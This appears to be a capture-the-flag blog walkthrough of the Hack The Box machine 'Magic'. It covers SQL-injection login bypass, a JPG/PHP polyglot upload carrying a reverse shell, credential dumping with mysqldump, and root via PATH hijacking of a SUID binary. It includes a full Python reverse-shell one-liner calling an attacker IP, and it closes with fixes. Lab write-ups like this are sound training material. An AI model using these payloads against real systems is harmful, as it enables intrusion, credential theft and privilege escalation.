---
layout: post
title:  "HTB: Magic Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---

{:refdef: style="text-align: center;"}
![Magic Logo](../../assets/img/writeups/htb/magic/info_card.png)
{: refdef}

Date: 5/11/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`SQL Injection to bypass login form -> Abuse file upload to get reverse shell -> Find db credentials for Theseus -> Use mysqldump to dump login table -> login with Theseus -> Abuse PATH to overwrite lshw binary and get root reverse shell`

### Recon and Enumeration

As always, we start with a `masscan`, followed by a detailed `nmap` scan.

{:refdef: style="text-align: center;"}
![Detailed Port Scan](../../assets/img/writeups/htb/magic/detailed_port_scan.png)
{: refdef}

The only thing open is ssh (22) and http (80). Time to enumerate the HTTP server.

#### HTTP Server (Port 80)

Upon navigating to 10.10.10.185, I found a page with images on it.

{:refdef: style="text-align: center;"}
![Magic Homepage](../../assets/img/writeups/htb/magic/site_root.png)
{: refdef}

Running gobuster with dirb's common.txt list did not produce anything valuable.

There is a login form that can be navigated to from the bottom left of the root page of the website.

{:refdef: style="text-align: center;"}
![Login Form](../../assets/img/writeups/htb/magic/login_form.png)
{: refdef}

I tried admin:admin, admin:password, etc. and got the same response each time

{:refdef: style="text-align: center;"}
![Invalid Login](../../assets/img/writeups/htb/magic/bad_credentials.png)
{: refdef}

As I did not believe I would find any credentials, the next best option was to try sql injection. Unfortunately, the login form does not allow spaces to be typed in. But it does allow spaces if you paste in a value.

I tried:

username: admin' or 1=1;  
password: password

So if the query looked like: "SELECT * FROM login WHERE username='$username' AND password='$password'"

With our inputs it would look like: "SELECT * FROM login WHERE username='admin' or 1=1; AND password='password'"

Since 1=1 is always true, the select statement returns all the values in the table, and allows us to bypass the login page. This redirects us to an upload page.

{:refdef: style="text-align: center;"}
![Upload Page](../../assets/img/writeups/htb/magic/upload_php.png)
{: refdef}

#### Magic Tricks (Initial Foothold)

This page allows us to upload files!! I tried to upload random files at first, and even a PHP reverse shell (silly me). But this upload was looking specifically for pictures. Common errors included:

Uploaingd any file without a .jpg, .png, .jpeg extension

{:refdef: style="text-align: center;"}
![Bad Extension](../../assets/img/writeups/htb/magic/bad_upload.png)
{: refdef}

If the file was NOT actually an image (but the extension was changed to look like one)

{:refdef: style="text-align: center;"}
![Not an image](../../assets/img/writeups/htb/magic/bad_upload_2.png)
{: refdef}

It was clear to me that I had to create a file which had the magic bytes of a PNG or JPG, but also have executable php code. I struggled to understand how to do this until I read this [writeup](https://davidhamann.de/2019/12/04/htb-writeup-networked/){:target="_blank"} on an old HTB machine by David Hamann ([1]).

**Note: Magic bytes are usually the first few bytes of a file. They are used to specify the type of a file. When you run the linux file command, it reads the magic bytes**

Following in his footsteps, I ran the following commands. The payload I used was the PHP webshell from [Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell){:target="_blank"} ([2]). If you use the webshell, just make sure to update the IP and port to correspond to your current machine.

~~~bash
# Add the magic number for a jpg to the file
echo -e '\xff\xd8\xff\xdb' > fake.php.jpg

# Open the file in VIM and paste in the payload
vim fake.php.jpg

# Prepare to catch the reverse shell
nc -lvnp 9001
~~~

Wait... if we name it fake.php.jpg, how does the browser know to execute the PHP code? According to David Hamann:

`This is not only an issue with the code but also the PHP configuration (in /etc/httpd/conf.d/php.conf), which is set to interpret files that have “.php” anywhere in them, not just as an extension. A file named something.php.somethingelse would thus also be given to the PHP interpreter.`

I think in the case of this box, the issue is with the .htaccess file. 

{:refdef: style="text-align: center;"}
![htaccess](../../assets/img/writeups/htb/magic/htaccess.png)
{: refdef}

The first line is a regular expression that matches a multitude of file extensions, including .php. It then hands off that file to a php interpreter. The problem is, the regular expression looks for any instance of .php (not only at the end). Which is why our file with extension of .php.jpg executes just fine (when in reality, it should not).

Note that there are other php shell payloads you could have used. I happened to have the web shell handy, which is why I used it. With my exploited image ready to go, I uploaded it to the web server. Instead of an error this time, I got a success message in the upper left corner of the page.

{:refdef: style="text-align: center;"}
![Successful Upload](../../assets/img/writeups/htb/magic/success_upload.png)
{: refdef}

Great, so our image is on the webserver... but how do we access it?

If you go back to the magic homepage, click on any of the images to expand it. Right click on the expanded imgage and select "Copy Image Location". Paste this value and you should see a link that is of the form:

http://10.10.10.185/images/uploads/\<FILENAME\>.\<FILE_EXTENSION\>

(You could also read the source code, and see where the image sources are there too)

So when we browsed to http://10.10.10.185/images/uploads/fake.php.jpg, our reverse shell popped.

{:refdef: style="text-align: center;"}
![www-data user](../../assets/img/writeups/htb/magic/www_data_user.png)
{: refdef}

With that, we have a foothold. I "upgraded" my shell to TTY following [RopNop's](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/){:target="_blank"} instructions, then moved on to getting user ([3]).

### Getting User 

#### Linpeas the First Time

I moved linpeas over to the box using `wget` and python's `simpleHTTPServer` module. I ran it, and did not find much, given we were a low level user. It did find the source files for the website, including a suspicious file named db.php5. If we naviagate to `/var/www/Magic/db.php5` we find a file that contains database credentials for a user named `theseus`.

{:refdef: style="text-align: center;"}
![Database Credentials](../../assets/img/writeups/htb/magic/database_credentials.png)
{: refdef}

We also see this being used in the login source code. Looks like we need to read from the `login` table. This code also shows clearly why were able to bypass the login with SQL injection.

{:refdef: style="text-align: center;"}
![Login PHP Code](../../assets/img/writeups/htb/magic/login_php_code.png)
{: refdef}

Great, now we could connect to the mySQL instance on the box with the `mysql` command line tool. Except I got the infamous "Command Not Found" from the system :(.

Ok.... so maybe not. I searched around the box to make sure the binary was not renamed, or moved, but couldn't come up with anything. Luckily I still had credentials, so there were a few options for where to go next:

1. Tunnel from my local machine to the box and use the `mysql` command line tool
2. Write a php script to dump the login table
3. Find another installed tool to access the database

I ended up going with option 3, although each option should work.

#### mysqldump

I was intrigued that it could be possible to have mySQL installed on a machine, but not have the `mysql` command line tools installed as well. I wanted to know if the default installation of mySQL incuded other less known command line tools that I could use. I ended up searching the entire box using the find command.

~~~bash
# This query filters out any line with the string "Permission Denied"
find /usr/bin -name *mysql* 2>&1 | grep -v "Permission Denied"
~~~

Note that I had to search multiple bin directories before finding what I was looking for in `usr/bin`.

The output of that command:

{:refdef: style="text-align: center;"}
![Finding mysql binaries](../../assets/img/writeups/htb/magic/find_mysql_bins.png)
{: refdef}

These are all command line tools included when you install mySQL onto a machine. I googled around some, and found that `mysqldump` is a tool used to dump databases during migrations (among other things). This includes schema, data, and other artifacts. Since I had credentials, I should have be able to dump the entire login table and grab that data in it.

Running mysqldump

{:refdef: style="text-align: center;"}
![Running mysql dump](../../assets/img/writeups/htb/magic/mysqldump.png)
{: refdef}

We found what we were looking for. Another password.

{:refdef: style="text-align: center;"}
![Finding mysql binaries](../../assets/img/writeups/htb/magic/login_table_dump.png)
{: refdef}

I immediately used this password to switch user to `theseus`, and it worked. We now have user.

{:refdef: style="text-align: center;"}
![Theseus user](../../assets/img/writeups/htb/magic/user_theseus.png)
{: refdef}

I also grabbed the user hash while there.

{:refdef: style="text-align: center;"}
![User hash](../../assets/img/writeups/htb/magic/user.png)
{: refdef}

### Privilege Escalation

#### linPEAS.... Again

With updated privileges, I ran linPEAS again. Based on forum reading, people made it clear to look for an installed program that does not belong on the box. I scoured linPEAS for longer than I would like to admin. I looked over processes, programs, etc. Nothing. Eventually, after talking with a fellow HTB participant, we determined that `sysinfo` found at `/bin/sysinfo` was something we had never seen before. 

Here you can see output from linPEAS. Sysinfo sitting unsuspected at the bottom of the list of binaries with a SUID bit. This means when you run the binary, the program inherits privleges from its owner (root in this case).

{:refdef: style="text-align: center;"}
![Linpeas Sysinfo](../../assets/img/writeups/htb/magic/linpeas_sysinfo.png)
{: refdef}

At this point, I needed to understand what this binary was. Running it spits out a bunch of system diagnostics (hence "system info"). But where was it getting this information, and what functions was it calling?

There is a sysinfo package in apt, but it did not look to be installed on the server. Interesting. I choose to grab `pspy` from my local machine, and see how this binary was running. `Pspy` monitors all the processes on a machine for changes. So once I ran `pspy`, and ran `sysinfo`, pspy spit out all the commands that sysinfo ran.

{:refdef: style="text-align: center;"}
![Pspy sysinfo](../../assets/img/writeups/htb/magic/pspy_sysinfo.png)
{: refdef}

So we see it calls a binary `lshw` (list hardware). This is a tool used to gather information of the hardware of a device. See its [man page](https://linux.die.net/man/1/lshw){:target="_blank"} ([4]). It also calls `fdisk`. This has to do with disk partitioning, and we will focus on lshw instead. So what did we have?

1. A binary we (as theseus) can run, which inherits root privlieges
2. Two binaries that are called during the execution of the first

So what can we do? The nice thing about linux is that there can be multiple versions of a binary on a box. But how does linux know which version of the binary to use? PATH. When searching for binaries, it searches each directory specified in the $PATH variable, in order. If it does not find the binary there, it yells at you about not existing. So what if we update the PATH, then write our own binary called lshw?

~~~bash
# Update the PATH to include /tmp
export PATH=/tmp:$PATH
touch lshw
# Open a text editor and paste in this payload
# 'python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"]);'
# Allow lshw to be executable, otherwise the system won't recognize it
chmod +x lshw
# Open up a reverse shell listener before hand
sysinfo
# Reset PATH and clean up our mess
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
rm lshw
~~~

In picture form:

{:refdef: style="text-align: center;"}
![Sysinfo Priviledge escalation](../../assets/img/writeups/htb/magic/priv_esc.png)
{: refdef}

Why did this work? Because we added `/tmp` to the beginning of the PATH, the system looked there for binaries first. Thus we could create our own binary and get root, and the root hash.

{:refdef: style="text-align: center;"}
![Root user](../../assets/img/writeups/htb/magic/root_user.png)
{: refdef}

**Note: In the root directory you will find a file `info.c`. This file looks to contain source code that matches the behavior of sysinfo. It is my belief that the `sysinfo` we abused was a compiled version of info.c**

### Conclusion

#### Fixes

1. SQL Injection can be used to bypass the login form  
   **Fix: Sanitize user input or use parameterized queries**
2. Remote Code Execution via file upload  
    **Fix: Check that file does not contain any scripting code, or only allow files with a single file extension**
3. Plaintext database credentials in db.php5    
   **Fix: Hard to get around this. Possibly restrict those credentials to read privilege only, as to not allow mysqldump usage**
4. Custom written `sysinfo` binary allows for command injection via PATH manipulation   
   **Fix: Remove the SUID bit from sysinfo, or make calls directly to a specific binary, such as /usr/bin/lshw**

#### Final Thoughts

I haven't done a box in 2 months, but this was a nice refresher (that also kicked my butt). Tons of lessons learned and reminders about enumeration, and common exploitation paths. Thanks to @TRX for the box creation, and @Helichopper for helping me see right in front of my face. Onto the next one...

*As always, if you have any questions or feedback, please contact me on HTB! I am always looking to improve my writing to make it as clear and concise as possible (while remaining somewhat beginner friendly). Happy Hacking!*

### References

1. Networked writeup: https://davidhamann.de/2019/12/04/htb-writeup-networked/
2. Pentest Monkey PHP Web Shell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
3. Upgrading shells to TTY: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
4. Lshw: https://linux.die.net/man/1/lshw